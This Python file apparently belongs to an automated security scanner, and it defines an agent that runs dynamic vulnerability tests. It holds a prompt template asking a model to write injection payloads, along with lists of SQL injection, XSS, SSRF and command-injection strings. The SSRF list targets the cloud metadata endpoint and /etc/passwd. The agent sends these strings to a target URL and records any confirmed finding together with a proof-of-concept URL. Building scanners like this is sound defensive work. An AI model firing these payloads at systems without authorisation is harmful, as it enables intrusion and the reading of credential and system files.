from __future__ import annotations

from typing import Any

from src.core.agent_base import BaseAgent
from src.core.validator import validate_finding

DAST_PROMPT = """You are a DAST agent. Based on SAST hints, test the target dynamically.

SAST hints: {sast_hints}
Target: {target}

Generate a single test payload for {vuln_type} at {test_url}.
Return ONLY a JSON:
{{
  "payload": "the test payload string",
  "param": "parameter name to inject into",
  "method": "GET or POST",
  "expected_indicator": "what to look for in response"
}}
"""

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    "' AND SLEEP(3)--",
    "1' AND '1'='1",
    "1' AND '1'='2",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "\"><script>alert(1)</script>",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1:80",
    "http://localhost:22",
    "http://169.254.169.254/latest/meta-data/",
    "file:///etc/passwd",
]

RCE_PAYLOADS = [
    "; id",
    "| id",
    "$(id)",
    "`id`",
    "'; id; #",
]


class DASTAgent(BaseAgent):
    name = "dast"
    description = "Dynamic testing guided by SAST findings"
    phase = "recon"

    async def run(self, params: dict[str, Any]) -> dict[str, Any]:
        target = params.get("target", "")
        vuln_type = params.get("vuln_type", "")
        test_url = params.get("test_url", target)
        test_param = params.get("test_param", "q")
        sast_hints = self.blackboard.get_fact("sast_findings") or []

        if not vuln_type:
            # Run general probe with top payloads
            return await self._general_probe(target)

        return await self._targeted_test(target, vuln_type, test_url, test_param, sast_hints)

    async def _targeted_test(self, target: str, vuln_type: str, test_url: str, test_param: str, sast_hints: list) -> dict[str, Any]:
        payloads = self._get_payloads(vuln_type)
        self.log(f"Testing {vuln_type} on {test_url} with {len(payloads)} payloads")

        for payload in payloads[:10]:
            full_url = f"{test_url}?{test_param}={__import__('urllib').parse.quote(payload)}"
            result = await self.tools.execute("http_fetch", url=full_url)

            validation = validate_finding(vuln_type, url=test_url, param=test_param,
                                          payload=payload, evidence_text=result)
            if validation["confirmed"]:
                finding = {
                    "title": f"{vuln_type.upper()} on {test_url}",
                    "severity": "high" if vuln_type in ("rce", "sqli") else "medium",
                    "description": f"Confirmed {vuln_type} via payload: {payload[:50]}",
                    "vuln_type": vuln_type,
                    "evidence": result[:500],
                    "poc": f"{full_url[:200]}",
                }
                self.add_finding(**finding)
                return {"status": "success", "findings": [finding], "payload": payload}

        return {"status": "clean", "findings": []}

    async def _general_probe(self, target: str) -> dict[str, Any]:
        self.log(f"General probe on {target}")
        findings_found = []

        for vuln_type in ["sqli", "xss", "ssrf", "rce"]:
            payloads = self._get_payloads(vuln_type)
            for payload in payloads[:5]:
                import urllib.parse
                full_url = f"{target}?q={urllib.parse.quote(payload)}"
                result = await self.tools.execute("http_fetch", url=full_url)

                validation = validate_finding(vuln_type, url=target, param="q",
                                              payload=payload, evidence_text=result)
                if validation["confirmed"]:
                    finding = {
                        "title": f"{vuln_type.upper()} detected on {target}",
                        "severity": "high",
                        "description": f"Confirmed via payload: {payload[:50]}",
                        "vuln_type": vuln_type,
                        "evidence": result[:500],
                    }
                    findings_found.append(finding)
                    break

        return {"status": "success" if findings_found else "clean", "findings": findings_found}

    @staticmethod
    def _get_payloads(vuln_type: str) -> list[str]:
        return {
            "sqli": SQLI_PAYLOADS,
            "xss": XSS_PAYLOADS,
            "ssrf": SSRF_PAYLOADS,
            "rce": RCE_PAYLOADS,
        }.get(vuln_type, [])
